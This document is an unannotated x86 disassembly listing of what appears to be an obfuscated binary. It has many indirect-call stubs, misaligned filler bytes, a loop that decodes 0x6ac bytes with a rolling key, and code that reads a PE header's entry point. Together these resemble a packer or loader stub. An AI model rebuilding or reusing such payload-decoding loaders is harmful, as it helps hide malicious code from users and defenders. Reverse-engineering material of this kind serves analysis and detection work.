  4d0763:	add    BYTE PTR [edi-0x1],bl
  4d0766:	adc    eax,0x4d2054
  4d076b:	call   edi
  4d076d:	add    BYTE PTR [eax],al
  4d076f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0775:	sub    esp,0x4c
  4d0778:	lea    esi,[eax+0x1bc]
  4d077e:	add    DWORD PTR [ebp-0xc],0xffffcc3d
  4d0785:	push   esi
  4d0786:	push   DWORD PTR [esi+0x140]
  4d078c:	push   ecx
  4d078d:	call   0x4d0ef4
  4d0792:	add    esp,0x8
  4d0795:	pop    esi
  4d0796:	mov    eax,0x0
  4d079b:	push   eax
  4d079c:	call   0x4d0854
  4d07a1:	add    esp,0x4
  4d07a4:	push   0x0
  4d07a6:	call   0x4d0a74
  4d07ab:	add    esp,0x4
  4d07ae:	add    esp,0x4c
  4d07b1:	pop    ebp
  4d07b2:	ret    
  4d07b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b9:	sub    esp,0x34
  4d07bc:	mov    edx,0x4d3164
  4d07c1:	cmp    edx,0x380c
  4d07c7:	jbe    0x4d07b7
  4d07c9:	push   edx
  4d07ca:	push   eax
  4d07cb:	push   DWORD PTR [edx+0x1a0]
  4d07d1:	push   DWORD PTR [edx+0x10]
  4d07d4:	call   0x4d1214
  4d07d9:	add    esp,0xc
  4d07dc:	pop    edx
  4d07dd:	push   edx
  4d07de:	mov    edx,0x0
  4d07e3:	push   edx
  4d07e4:	call   0x4d0904
  4d07e9:	add    esp,0x4
  4d07ec:	pop    edx
  4d07ed:	mov    ecx,0x4d2030
  4d07f2:	mov    ecx,DWORD PTR [ecx]
  4d07f4:	push   ecx
  4d07f5:	push   DWORD PTR [edx+0x18]
  4d07f8:	pop    ebx
  4d07f9:	call   ebx
  4d07fb:	add    esp,0x34
  4d07fe:	pop    ebp
  4d07ff:	ret    
  4d0800:	pop    edi
  4d0801:	call   DWORD PTR ds:0x4d203c
  4d0807:	call   edi
  4d0809:	add    BYTE PTR [eax],al
  4d080b:	add    BYTE PTR [edi-0x1],bl
  4d080e:	adc    eax,0x4d2088
  4d0813:	call   edi
  4d0815:	add    BYTE PTR [eax],al
  4d0817:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d081d:	sub    esp,0x50
  4d0820:	mov    esi,0x4d3120
  4d0825:	add    DWORD PTR [esi+0x40],0xffffffd8
  4d0829:	push   esi
  4d082a:	push   eax
  4d082b:	push   ebx
  4d082c:	call   0x4d1378
  4d0831:	add    esp,0x8
  4d0834:	pop    esi
  4d0835:	mov    edi,0x0
  4d083a:	push   edi
  4d083b:	call   0x4d0904
  4d0840:	add    esp,0x4
  4d0843:	push   0x0
  4d0845:	call   0x4d0854
  4d084a:	add    esp,0x4
  4d084d:	add    esp,0x50
  4d0850:	pop    ebp
  4d0851:	ret    
  4d0852:	add    BYTE PTR [eax],al
  4d0854:	pop    edi
  4d0855:	call   DWORD PTR ds:0x4d2008
  4d085b:	call   edi
  4d085d:	add    BYTE PTR [eax],al
  4d085f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0865:	sub    esp,0x20
  4d0868:	lea    edx,[eax-0x8]
  4d086b:	add    esi,DWORD PTR [ebp-0x14]
  4d086e:	push   edx
  4d086f:	push   edi
  4d0870:	push   DWORD PTR [edx+0xe8]
  4d0876:	push   DWORD PTR [edx+0x104]
  4d087c:	call   0x4d0d38
  4d0881:	add    esp,0xc
  4d0884:	pop    edx
  4d0885:	push   edx
  4d0886:	mov    ecx,0x0
  4d088b:	push   ecx
  4d088c:	call   0x4d13c0
  4d0891:	add    esp,0x4
  4d0894:	pop    edx
  4d0895:	push   edx
  4d0896:	mov    edi,0x0
  4d089b:	push   edi
  4d089c:	call   0x4d15c0
  4d08a1:	add    esp,0x4
  4d08a4:	pop    edx
  4d08a5:	add    esp,0x20
  4d08a8:	pop    ebp
  4d08a9:	ret    
  4d08aa:	add    BYTE PTR [eax],al
  4d08ac:	pop    edi
  4d08ad:	call   DWORD PTR ds:0x4d209c
  4d08b3:	call   edi
  4d08b5:	add    BYTE PTR [eax],al
  4d08b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08bd:	sub    esp,0x5c
  4d08c0:	lea    edx,ds:0x4d3194
  4d08c6:	sub    esi,0x7e42
  4d08cc:	push   edx
  4d08cd:	push   esi
  4d08ce:	push   DWORD PTR [edx+0x64]
  4d08d1:	push   ecx
  4d08d2:	call   0x4d1508
  4d08d7:	add    esp,0xc
  4d08da:	pop    edx
  4d08db:	push   edx
  4d08dc:	push   0x0
  4d08de:	call   0x4d15c0
  4d08e3:	add    esp,0x4
  4d08e6:	pop    edx
  4d08e7:	push   edx
  4d08e8:	lea    ecx,[edx-0x194]
  4d08ee:	push   ecx
  4d08ef:	call   0x4d0c44
  4d08f4:	add    esp,0x4
  4d08f7:	test   eax,eax
  4d08f9:	jne    0x4d08e8
  4d08fb:	pop    edx
  4d08fc:	add    esp,0x5c
  4d08ff:	pop    ebp
  4d0900:	ret    
  4d0901:	add    BYTE PTR [eax],al
  4d0903:	add    BYTE PTR [edi-0x1],bl
  4d0906:	adc    eax,0x4d2044
  4d090b:	call   edi
  4d090d:	add    BYTE PTR [eax],al
  4d090f:	add    BYTE PTR [edi-0x1],bl
  4d0912:	adc    eax,0x4d2048
  4d0917:	call   edi
  4d0919:	add    BYTE PTR [eax],al
  4d091b:	add    BYTE PTR [edi-0x1],bl
  4d091e:	adc    eax,0x4d2068
  4d0923:	call   edi
  4d0925:	add    BYTE PTR [eax],al
  4d0927:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d092d:	sub    esp,0x38
  4d0930:	and    DWORD PTR [eax-0x74],eax
  4d0933:	lea    edx,ds:0x4d3098
  4d0939:	push   edx
  4d093a:	push   0x6ac
  4d093f:	mov    eax,0x6ac
  4d0944:	push   eax
  4d0945:	mov    ecx,0x40001
  4d094a:	push   ecx
  4d094b:	mov    esi,0x86298592
  4d0950:	push   DWORD PTR [esi+0x7a239a86]
  4d0956:	sub    DWORD PTR [esp],0x2
  4d095a:	mov    esi,0x4d203c
  4d095f:	pop    DWORD PTR [esi]
  4d0961:	call   0x4d0800
  4d0966:	add    esp,0x4
  4d0969:	xchg   DWORD PTR [esp],eax
  4d096c:	mov    edx,eax
  4d096e:	pop    DWORD PTR [edx+0xe4]
  4d0974:	mov    edi,DWORD PTR [edx+0xe4]
  4d097a:	lea    ecx,[edi]
  4d097c:	sub    esi,esi
  4d097e:	dec    esi
  4d097f:	and    esi,0x4d0014
  4d0985:	mov    ebx,0x8d9ae218
  4d098a:	xor    eax,eax
  4d098c:	cmp    eax,0x6ac
  4d0991:	je     0x4d09af
  4d0993:	sub    eax,0xfffffffc
  4d0996:	xor    edi,edi
  4d0998:	push   DWORD PTR [esi+edi*1]
  4d099b:	add    DWORD PTR [esp],ebx
  4d099e:	pop    DWORD PTR [ecx+edi*2]
  4d09a1:	dec    DWORD PTR [ecx]
  4d09a3:	xor    ebx,ebx
  4d09a5:	add    ebx,DWORD PTR [esi]
  4d09a7:	add    esi,0x4
  4d09aa:	add    ecx,0x4
  4d09ad:	jmp    0x4d098c
  4d09af:	push   edx
  4d09b0:	push   0x0
  4d09b2:	call   0x4d0740
  4d09b7:	add    esp,0x4
  4d09ba:	pop    edx
  4d09bb:	add    esp,0x38
  4d09be:	pop    ebp
  4d09bf:	ret    
  4d09c0:	mov    edi,edi
  4d09c2:	push   ebp
  4d09c3:	mov    ebp,esp
  4d09c5:	sub    esp,0x34
  4d09c8:	lea    eax,[edx-0x20]
  4d09cb:	or     edi,DWORD PTR [eax-0xf8]
  4d09d1:	push   eax
  4d09d2:	push   ebx
  4d09d3:	push   ecx
  4d09d4:	push   DWORD PTR [eax+0xe8]
  4d09da:	call   0x4d0860
  4d09df:	add    esp,0xc
  4d09e2:	pop    eax
  4d09e3:	push   eax
  4d09e4:	push   0x0
  4d09e6:	call   0x4d0a80
  4d09eb:	add    esp,0x4
  4d09ee:	pop    eax
  4d09ef:	push   eax
  4d09f0:	lea    ecx,[eax-0x11c]
  4d09f6:	push   ecx
  4d09f7:	call   0x4d0c44
  4d09fc:	add    esp,0x4
  4d09ff:	test   eax,eax
  4d0a01:	jne    0x4d09f0
  4d0a03:	pop    eax
  4d0a04:	add    esp,0x34
  4d0a07:	pop    ebp
  4d0a08:	ret    
  4d0a09:	add    BYTE PTR [eax],al
  4d0a0b:	add    BYTE PTR [edi-0x1],bl
  4d0a0e:	adc    eax,0x4d202c
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a1d:	sub    esp,0x4c
  4d0a20:	lea    eax,ds:0x4d3080
  4d0a26:	adc    DWORD PTR [eax+0x100],0xffffb10c
  4d0a30:	push   eax
  4d0a31:	mov    esi,0x0
  4d0a36:	push   esi
  4d0a37:	call   0x4d15c0
  4d0a3c:	add    esp,0x4
  4d0a3f:	pop    eax
  4d0a40:	push   eax
  4d0a41:	push   DWORD PTR [eax+0x54]
  4d0a44:	push   DWORD PTR [eax+0x158]
  4d0a4a:	push   DWORD PTR [eax+0x1c8]
  4d0a50:	push   edx
  4d0a51:	call   0x4d1330
  4d0a56:	add    esp,0x10
  4d0a59:	pop    eax
  4d0a5a:	push   eax
  4d0a5b:	lea    ecx,[eax-0x80]
  4d0a61:	push   ecx
  4d0a62:	call   0x4d0c44
  4d0a67:	add    esp,0x4
  4d0a6a:	test   eax,eax
  4d0a6c:	jne    0x4d0a5b
  4d0a6e:	pop    eax
  4d0a6f:	add    esp,0x4c
  4d0a72:	pop    ebp
  4d0a73:	ret    
  4d0a74:	pop    edi
  4d0a75:	call   DWORD PTR ds:0x4d2000
  4d0a7b:	call   edi
  4d0a7d:	add    BYTE PTR [eax],al
  4d0a7f:	add    BYTE PTR [edi-0x1],bl
  4d0a82:	adc    eax,0x4d205c
  4d0a87:	call   edi
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x38
  4d0a94:	mov    ecx,0x4d3160
  4d0a99:	cmp    ecx,0x1eb0
  4d0a9f:	je     0x4d0a8f
  4d0aa1:	push   ecx
  4d0aa2:	push   eax
  4d0aa3:	push   DWORD PTR [ecx+0x6c]
  4d0aa6:	call   0x4d0d8c
  4d0aab:	add    esp,0x8
  4d0aae:	pop    ecx
  4d0aaf:	push   ecx
  4d0ab0:	push   0x0
  4d0ab2:	call   0x4d15b4
  4d0ab7:	add    esp,0x4
  4d0aba:	pop    ecx
  4d0abb:	push   ecx
  4d0abc:	push   0x0
  4d0abe:	call   0x4d074c
  4d0ac3:	add    esp,0x4
  4d0ac6:	pop    ecx
  4d0ac7:	add    esp,0x38
  4d0aca:	pop    ebp
  4d0acb:	ret    
  4d0acc:	mov    edi,edi
  4d0ace:	push   ebp
  4d0acf:	mov    ebp,esp
  4d0ad1:	sub    esp,0x60
  4d0ad4:	mov    edi,0x4d3074
  4d0ad9:	add    ebx,0xffffff95
  4d0adc:	push   edi
  4d0add:	push   eax
  4d0ade:	push   esi
  4d0adf:	push   DWORD PTR [edi+0x1b8]
  4d0ae5:	push   esi
  4d0ae6:	call   0x4d155c
  4d0aeb:	add    esp,0x10
  4d0aee:	pop    edi
  4d0aef:	push   edi
  4d0af0:	push   0x0
  4d0af2:	call   0x4d15b4
  4d0af7:	add    esp,0x4
  4d0afa:	pop    edi
  4d0afb:	push   edi
  4d0afc:	push   0x0
  4d0afe:	call   0x4d0740
  4d0b03:	add    esp,0x4
  4d0b06:	pop    edi
  4d0b07:	add    esp,0x60
  4d0b0a:	pop    ebp
  4d0b0b:	ret    
  4d0b0c:	pop    edi
  4d0b0d:	call   DWORD PTR ds:0x4d2084
  4d0b13:	call   edi
  4d0b15:	add    BYTE PTR [eax],al
  4d0b17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b1d:	sub    esp,0x34
  4d0b20:	lea    ebx,[edx+0x4c]
  4d0b23:	mov    DWORD PTR [ebp-0x34],0xffffef25
  4d0b2a:	push   ebx
  4d0b2b:	push   eax
  4d0b2c:	push   DWORD PTR [ebx+0x154]
  4d0b32:	push   edi
  4d0b33:	push   DWORD PTR [ebx+0xf0]
  4d0b39:	call   0x4d0c50
  4d0b3e:	add    esp,0x10
  4d0b41:	pop    ebx
  4d0b42:	call   0x4d1474
  4d0b47:	add    esp,0x4
  4d0b4a:	call   0x4d1474
  4d0b4f:	add    esp,0x4
  4d0b52:	add    esp,0x34
  4d0b55:	pop    ebp
  4d0b56:	ret    
  4d0b57:	add    BYTE PTR [edi-0x1],bl
  4d0b5a:	adc    eax,0x4d204c
  4d0b5f:	call   edi
  4d0b61:	add    BYTE PTR [eax],al
  4d0b63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b69:	sub    esp,0x2c
  4d0b6c:	mov    edi,0x4d31d0
  4d0b71:	and    DWORD PTR [ebp-0x18],esi
  4d0b74:	push   edi
  4d0b75:	push   0x0
  4d0b77:	call   0x4d0854
  4d0b7c:	add    esp,0x4
  4d0b7f:	pop    edi
  4d0b80:	push   edi
  4d0b81:	push   esi
  4d0b82:	push   edx
  4d0b83:	push   DWORD PTR [edi+0x98]
  4d0b89:	push   DWORD PTR [edi+0x8c]
  4d0b8f:	call   0x4d0e14
  4d0b94:	add    esp,0x10
  4d0b97:	pop    edi
  4d0b98:	push   edi
  4d0b99:	push   0x0
  4d0b9b:	call   0x4d0740
  4d0ba0:	add    esp,0x4
  4d0ba3:	pop    edi
  4d0ba4:	add    esp,0x2c
  4d0ba7:	pop    ebp
  4d0ba8:	ret    
  4d0ba9:	add    BYTE PTR [eax],al
  4d0bab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bb1:	sub    esp,0x34
  4d0bb4:	lea    edi,[ebx-0x90]
  4d0bba:	cmp    edi,0x175
  4d0bc0:	jb     0x4d0baf
  4d0bc2:	push   edi
  4d0bc3:	push   0x0
  4d0bc5:	call   0x4d0a80
  4d0bca:	add    esp,0x4
  4d0bcd:	pop    edi
  4d0bce:	push   edi
  4d0bcf:	push   ebx
  4d0bd0:	push   ebx
  4d0bd1:	push   DWORD PTR [edi+0x18c]
  4d0bd7:	push   DWORD PTR [edi+0x100]
  4d0bdd:	call   0x4d10bc
  4d0be2:	add    esp,0x10
  4d0be5:	pop    edi
  4d0be6:	push   edi
  4d0be7:	mov    edx,0xfffffff4
  4d0bec:	push   edx
  4d0bed:	call   0x4d1550
  4d0bf2:	add    esp,0x4
  4d0bf5:	pop    edi
  4d0bf6:	add    esp,0x34
  4d0bf9:	pop    ebp
  4d0bfa:	ret    
  4d0bfb:	add    BYTE PTR [edi+0x2b],dl
  4d0bfe:	call   DWORD PTR [edi+0x57]
  4d0c01:	push   edi
  4d0c02:	push   edi
  4d0c03:	call   0x4d13cc
  4d0c08:	sub    esp,0xfffffffc
  4d0c0b:	call   0x4d0fc0
  4d0c10:	push   0x2
  4d0c12:	xor    eax,eax
  4d0c14:	sub    eax,0x4d3030
  4d0c19:	neg    eax
  4d0c1b:	push   0x0
  4d0c1d:	lea    ecx,[eax+0x4]
  4d0c20:	add    BYTE PTR [ecx],0x3
  4d0c23:	push   eax
  4d0c24:	call   0x4d0800
  4d0c29:	pop    edi
  4d0c2a:	pop    edi
  4d0c2b:	pop    edi
  4d0c2c:	lea    ecx,[eax+0x3b]
  4d0c2f:	mov    edi,DWORD PTR [ecx]
  4d0c31:	lea    eax,[eax+edi*1]
  4d0c34:	mov    eax,DWORD PTR [eax+0x28]
  4d0c37:	pusha  
  4d0c38:	mov    ah,0x45
  4d0c3a:	sub    al,ah
  4d0c3c:	ja     0x4d07b4
  4d0c42:	popa   
  4d0c43:	ret    
  4d0c44:	pop    edi
  4d0c45:	call   DWORD PTR ds:0x4d2030
  4d0c4b:	call   edi
  4d0c4d:	add    BYTE PTR [eax],al
  4d0c4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c55:	sub    esp,0x3c
  4d0c58:	mov    eax,0x4d3130
  4d0c5d:	adc    DWORD PTR [eax-0x6c],0xfffffe3c
  4d0c64:	push   eax
  4d0c65:	push   0x0
  4d0c67:	call   0x4d0b58
  4d0c6c:	add    esp,0x4
  4d0c6f:	pop    eax
  4d0c70:	push   eax
  4d0c71:	push   DWORD PTR [eax+0x7c]
  4d0c74:	push   DWORD PTR [eax+0x8c]
  4d0c7a:	push   ebx
  4d0c7b:	call   0x4d0928
  4d0c80:	add    esp,0xc
  4d0c83:	pop    eax
  4d0c84:	push   eax
  4d0c85:	call   0x4d1474
  4d0c8a:	add    esp,0x4
  4d0c8d:	pop    eax
  4d0c8e:	add    esp,0x3c
  4d0c91:	pop    ebp
  4d0c92:	ret    
  4d0c93:	add    BYTE PTR [edi-0x1],bl
  4d0c96:	adc    eax,0x4d2074
  4d0c9b:	call   edi
  4d0c9d:	add    BYTE PTR [eax],al
  4d0c9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ca5:	sub    esp,0x44
  4d0ca8:	lea    edx,[eax-0x178]
  4d0cae:	add    edi,0x29b9
  4d0cb4:	push   edx
  4d0cb5:	push   DWORD PTR [edx+0x20]
  4d0cb8:	push   ebx
  4d0cb9:	call   0x4d1078
  4d0cbe:	add    esp,0x8
  4d0cc1:	pop    edx
  4d0cc2:	push   edx
  4d0cc3:	mov    eax,0x0
  4d0cc8:	push   eax
  4d0cc9:	call   0x4d15b4
  4d0cce:	add    esp,0x4
  4d0cd1:	pop    edx
  4d0cd2:	push   edx
  4d0cd3:	call   0x4d0a0c
  4d0cd8:	add    esp,0x4
  4d0cdb:	pop    edx
  4d0cdc:	add    esp,0x44
  4d0cdf:	pop    ebp
  4d0ce0:	ret    
  4d0ce1:	add    BYTE PTR [eax],al
  4d0ce3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ce9:	sub    esp,0x30
  4d0cec:	mov    eax,0x4d3068
  4d0cf1:	adc    ebx,DWORD PTR [eax+0xd8]
  4d0cf7:	push   eax
  4d0cf8:	lea    ecx,[eax-0x68]
  4d0cfb:	push   ecx
  4d0cfc:	call   0x4d0c44
  4d0d01:	add    esp,0x4
  4d0d04:	test   eax,eax
  4d0d06:	jne    0x4d0cf8
  4d0d08:	pop    eax
  4d0d09:	push   eax
  4d0d0a:	push   ecx
  4d0d0b:	push   DWORD PTR [eax+0x8c]
  4d0d11:	push   DWORD PTR [eax+0x30]
  4d0d14:	push   DWORD PTR [eax+0x164]
  4d0d1a:	call   0x4d0b64
  4d0d1f:	add    esp,0x10
  4d0d22:	pop    eax
  4d0d23:	push   eax
  4d0d24:	mov    eax,0x0
  4d0d29:	push   eax
  4d0d2a:	call   0x4d15b4
  4d0d2f:	add    esp,0x4
  4d0d32:	pop    eax
  4d0d33:	add    esp,0x30
  4d0d36:	pop    ebp
  4d0d37:	ret    
  4d0d38:	mov    edi,edi
  4d0d3a:	push   ebp
  4d0d3b:	mov    ebp,esp
  4d0d3d:	sub    esp,0x3c
  4d0d40:	mov    ecx,0x4d31e0
  4d0d45:	xor    eax,0xffffb02b
  4d0d4a:	push   ecx
  4d0d4b:	push   DWORD PTR [ecx+0x80]
  4d0d51:	push   DWORD PTR [ecx+0x20]
  4d0d54:	push   ebx
  4d0d55:	call   0x4d14c8
  4d0d5a:	add    esp,0xc
  4d0d5d:	pop    ecx
  4d0d5e:	push   ecx
  4d0d5f:	push   0x0
  4d0d61:	call   0x4d13c0
  4d0d66:	add    esp,0x4
  4d0d69:	pop    ecx
  4d0d6a:	push   ecx
  4d0d6b:	mov    eax,0x0
  4d0d70:	push   eax
  4d0d71:	call   0x4d15c0
  4d0d76:	add    esp,0x4
  4d0d79:	pop    ecx
  4d0d7a:	add    esp,0x3c
  4d0d7d:	pop    ebp
  4d0d7e:	ret    
  4d0d7f:	add    BYTE PTR [edi-0x1],bl
  4d0d82:	adc    eax,0x4d2040
  4d0d87:	call   edi
  4d0d89:	add    BYTE PTR [eax],al
  4d0d8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d91:	sub    esp,0x20
  4d0d94:	lea    edx,[ecx-0x11c]
  4d0d9a:	sub    DWORD PTR [edx-0x40],0xffffffb3
  4d0d9e:	push   edx
  4d0d9f:	lea    esi,[edx-0x44]
  4d0da2:	push   esi
  4d0da3:	call   0x4d0c44
  4d0da8:	add    esp,0x4
  4d0dab:	test   eax,eax
  4d0dad:	jne    0x4d0d9f
  4d0daf:	pop    edx
  4d0db0:	push   edx
  4d0db1:	push   DWORD PTR [edx+0xc]
  4d0db4:	push   DWORD PTR [edx+0xe4]
  4d0dba:	call   0x4d1024
  4d0dbf:	add    esp,0x8
  4d0dc2:	pop    edx
  4d0dc3:	push   edx
  4d0dc4:	push   0x0
  4d0dc6:	call   0x4d15c0
  4d0dcb:	add    esp,0x4
  4d0dce:	pop    edx
  4d0dcf:	add    esp,0x20
  4d0dd2:	pop    ebp
  4d0dd3:	ret    
  4d0dd4:	mov    edi,edi
  4d0dd6:	push   ebp
  4d0dd7:	mov    ebp,esp
  4d0dd9:	sub    esp,0x4c
  4d0ddc:	lea    ecx,[edi-0x9c]
  4d0de2:	xor    ebx,DWORD PTR [ecx+0x38]
  4d0de5:	push   ecx
  4d0de6:	call   0x4d1474
  4d0deb:	add    esp,0x4
  4d0dee:	pop    ecx
  4d0def:	push   ecx
  4d0df0:	push   eax
  4d0df1:	push   edx
  4d0df2:	push   DWORD PTR [ecx+0x148]
  4d0df8:	call   0x4d06ec
  4d0dfd:	add    esp,0xc
  4d0e00:	pop    ecx
  4d0e01:	push   ecx
  4d0e02:	push   0x0
  4d0e04:	call   0x4d0a74
  4d0e09:	add    esp,0x4
  4d0e0c:	pop    ecx
  4d0e0d:	add    esp,0x4c
  4d0e10:	pop    ebp
  4d0e11:	ret    
  4d0e12:	add    BYTE PTR [eax],al
  4d0e14:	mov    edi,edi
  4d0e16:	push   ebp
  4d0e17:	mov    ebp,esp
  4d0e19:	sub    esp,0x24
  4d0e1c:	lea    ecx,ds:0x4d31e4
  4d0e22:	add    eax,DWORD PTR [ecx-0x118]
  4d0e28:	push   ecx
  4d0e29:	push   0xfffffff4
  4d0e2b:	call   0x4d1550
  4d0e30:	add    esp,0x4
  4d0e33:	pop    ecx
  4d0e34:	push   ecx
  4d0e35:	push   DWORD PTR [ecx+0x14]
  4d0e38:	push   DWORD PTR [ecx+0x198]
  4d0e3e:	push   eax
  4d0e3f:	push   DWORD PTR [ecx+0x54]
  4d0e42:	call   0x4d1254
  4d0e47:	add    esp,0x10
  4d0e4a:	pop    ecx
  4d0e4b:	push   ecx
  4d0e4c:	mov    eax,0x0
  4d0e51:	push   eax
  4d0e52:	call   0x4d13c0
  4d0e57:	add    esp,0x4
  4d0e5a:	pop    ecx
  4d0e5b:	add    esp,0x24
  4d0e5e:	pop    ebp
  4d0e5f:	ret    
  4d0e60:	mov    edi,edi
  4d0e62:	push   ebp
  4d0e63:	mov    ebp,esp
  4d0e65:	sub    esp,0x4c
  4d0e68:	mov    eax,0x4d3168
  4d0e6d:	sbb    DWORD PTR [ebp-0x30],0x12f2
  4d0e74:	push   eax
  4d0e75:	push   ecx
  4d0e76:	push   DWORD PTR [eax+0xbc]
  4d0e7c:	call   0x4d0f40
  4d0e81:	add    esp,0x8
  4d0e84:	pop    eax
  4d0e85:	push   eax
  4d0e86:	push   0x0
  4d0e88:	call   0x4d15c0
  4d0e8d:	add    esp,0x4
  4d0e90:	pop    eax
  4d0e91:	push   eax
  4d0e92:	mov    eax,0x0
  4d0e97:	push   eax
  4d0e98:	call   0x4d0904
  4d0e9d:	add    esp,0x4
  4d0ea0:	pop    eax
  4d0ea1:	add    esp,0x4c
  4d0ea4:	pop    ebp
  4d0ea5:	ret    
  4d0ea6:	add    BYTE PTR [eax],al
  4d0ea8:	pop    edi
  4d0ea9:	call   DWORD PTR ds:0x4d2058
  4d0eaf:	call   edi
  4d0eb1:	add    BYTE PTR [eax],al
  4d0eb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0eb9:	sub    esp,0x24
  4d0ebc:	lea    edx,ds:0x4d3084
  4d0ec2:	xor    ecx,DWORD PTR [edx+0x104]
  4d0ec8:	push   edx
  4d0ec9:	call   0x4d1474
  4d0ece:	add    esp,0x4
  4d0ed1:	pop    edx
  4d0ed2:	push   edx
  4d0ed3:	push   ecx
  4d0ed4:	push   DWORD PTR [edx+0x1dc]
  4d0eda:	push   edi
  4d0edb:	call   0x4d0b18
  4d0ee0:	add    esp,0xc
  4d0ee3:	pop    edx
  4d0ee4:	push   edx
  4d0ee5:	call   0x4d1474
  4d0eea:	add    esp,0x4
  4d0eed:	pop    edx
  4d0eee:	add    esp,0x24
  4d0ef1:	pop    ebp
  4d0ef2:	ret    
  4d0ef3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef9:	sub    esp,0x48
  4d0efc:	mov    edx,0x4d313c
  4d0f01:	mov    esi,eax
  4d0f03:	push   edx
  4d0f04:	mov    eax,0x0
  4d0f09:	push   eax
  4d0f0a:	call   0x4d13c0
  4d0f0f:	add    esp,0x4
  4d0f12:	pop    edx
  4d0f13:	push   edx
  4d0f14:	push   DWORD PTR [edx+0x178]
  4d0f1a:	push   DWORD PTR [edx+0x138]
  4d0f20:	call   0x4d09c0
  4d0f25:	add    esp,0x8
  4d0f28:	pop    edx
  4d0f29:	push   edx
  4d0f2a:	mov    edi,0x0
  4d0f2f:	push   edi
  4d0f30:	call   0x4d0b58
  4d0f35:	add    esp,0x4
  4d0f38:	pop    edx
  4d0f39:	add    esp,0x48
  4d0f3c:	pop    ebp
  4d0f3d:	ret    
  4d0f3e:	add    BYTE PTR [eax],al
  4d0f40:	mov    edi,edi
  4d0f42:	push   ebp
  4d0f43:	mov    ebp,esp
  4d0f45:	sub    esp,0x2c
  4d0f48:	mov    esi,0x4d3158
  4d0f4d:	sbb    DWORD PTR [esi-0x100],0xfffff6aa
  4d0f57:	call   0x4d0a0c
  4d0f5c:	add    esp,0x4
  4d0f5f:	push   esi
  4d0f60:	push   DWORD PTR [esi+0x180]
  4d0f66:	push   edx
  4d0f67:	call   0x4d1140
  4d0f6c:	add    esp,0x8
  4d0f6f:	pop    esi
  4d0f70:	mov    edi,0x0
  4d0f75:	push   edi
  4d0f76:	call   0x4d074c
  4d0f7b:	add    esp,0x4
  4d0f7e:	add    esp,0x2c
  4d0f81:	pop    ebp
  4d0f82:	ret    
  4d0f83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f89:	sub    esp,0x5c
  4d0f8c:	mov    edx,0x4d31a4
  4d0f91:	adc    DWORD PTR [edx-0x194],0x22
  4d0f98:	push   edx
  4d0f99:	push   ebx
  4d0f9a:	push   ecx
  4d0f9b:	push   esi
  4d0f9c:	call   0x4d0a8c
  4d0fa1:	add    esp,0xc
  4d0fa4:	pop    edx
  4d0fa5:	push   edx
  4d0fa6:	push   0x0
  4d0fa8:	call   0x4d15b4
  4d0fad:	add    esp,0x4
  4d0fb0:	pop    edx
  4d0fb1:	push   edx
  4d0fb2:	call   0x4d1474
  4d0fb7:	add    esp,0x4
  4d0fba:	pop    edx
  4d0fbb:	add    esp,0x5c
  4d0fbe:	pop    ebp
  4d0fbf:	ret    
  4d0fc0:	pop    edi
  4d0fc1:	call   DWORD PTR ds:0x4d2020
  4d0fc7:	call   edi
  4d0fc9:	add    BYTE PTR [eax],al
  4d0fcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fd1:	sub    esp,0x3c
  4d0fd4:	lea    ebx,ds:0x4d3120
  4d0fda:	cmp    ebx,0x38b5
  4d0fe0:	jbe    0x4d0fcf
  4d0fe2:	mov    ecx,0x0
  4d0fe7:	push   ecx
  4d0fe8:	call   0x4d0a74
  4d0fed:	add    esp,0x4
  4d0ff0:	push   ebx
  4d0ff1:	push   ecx
  4d0ff2:	push   DWORD PTR [ebx+0x6c]
  4d0ff5:	call   0x4d12f0
  4d0ffa:	add    esp,0x8
  4d0ffd:	pop    ebx
  4d0ffe:	call   0x4d13cc
  4d1003:	add    esp,0x4
  4d1006:	add    esp,0x3c
  4d1009:	pop    ebp
  4d100a:	ret    
  4d100b:	add    BYTE PTR [edi-0x1],bl
  4d100e:	adc    eax,0x4d2094
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [edi-0x1],bl
  4d101a:	adc    eax,0x4d2004
  4d101f:	call   edi
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1029:	sub    esp,0x44
  4d102c:	lea    edi,ds:0x4d3134
  4d1032:	sub    DWORD PTR [edi-0x10],0xfffffff4
  4d1036:	push   edi
  4d1037:	push   DWORD PTR [edi+0x188]
  4d103d:	push   DWORD PTR [edi+0x160]
  4d1043:	push   eax
  4d1044:	call   0x4d08b8
  4d1049:	add    esp,0xc
  4d104c:	pop    edi
  4d104d:	push   edi
  4d104e:	push   0x0
  4d1050:	call   0x4d13c0
  4d1055:	add    esp,0x4
  4d1058:	pop    edi
  4d1059:	push   edi
  4d105a:	push   0x0
  4d105c:	call   0x4d0b58
  4d1061:	add    esp,0x4
  4d1064:	pop    edi
  4d1065:	add    esp,0x44
  4d1068:	pop    ebp
  4d1069:	ret    
  4d106a:	add    BYTE PTR [eax],al
  4d106c:	pop    edi
  4d106d:	call   DWORD PTR ds:0x4d2090
  4d1073:	call   edi
  4d1075:	add    BYTE PTR [eax],al
  4d1077:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d107d:	sub    esp,0x34
  4d1080:	lea    ebx,ds:0x4d30e8
  4d1086:	cmp    ebx,0x295e
